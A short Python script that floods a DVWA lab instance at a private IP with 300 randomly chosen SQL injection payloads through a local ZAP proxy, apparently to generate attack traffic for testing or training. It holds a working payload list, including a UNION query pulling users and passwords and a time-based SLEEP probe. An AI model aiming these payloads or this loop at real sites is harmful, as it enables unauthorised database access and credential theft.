import random
import time
import requests
from urllib.parse import quote

TARGET = "http://192.168.56.20/DVWA/vulnerabilities/sqli/"
COUNT = 300   # increase to 500 or 1000 later

PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

payloads = [
    "1' OR '1'='1",
    "1 UNION SELECT user,password FROM users",
    "' OR 1=1#",
    "admin' --",
    "1' AND SLEEP(5)#",
    "1' OR 'a'='a",
    "1') OR ('1'='1",
    "1' UNION SELECT null,null--",
    "1 OR 1=1",
    "1' OR 1=1-- -"
]

session = requests.Session()

print(f"[+] Sending {COUNT} SQLi requests through ZAP proxy...")

for i in range(1, COUNT + 1):
    payload = random.choice(payloads)
    encoded = quote(payload)

    url = f"{TARGET}?id={encoded}&Submit=Submit"

    try:
        r = session.get(
            url,
            proxies=PROXIES,
            timeout=10,
            allow_redirects=False
        )

        print(f"[{i}/{COUNT}] status={r.status_code} payload={payload}")

    except Exception as e:
        print(f"[{i}/{COUNT}] ERROR: {e}")

    time.sleep(0.05)

print("[+] SQLi traffic generation complete.")
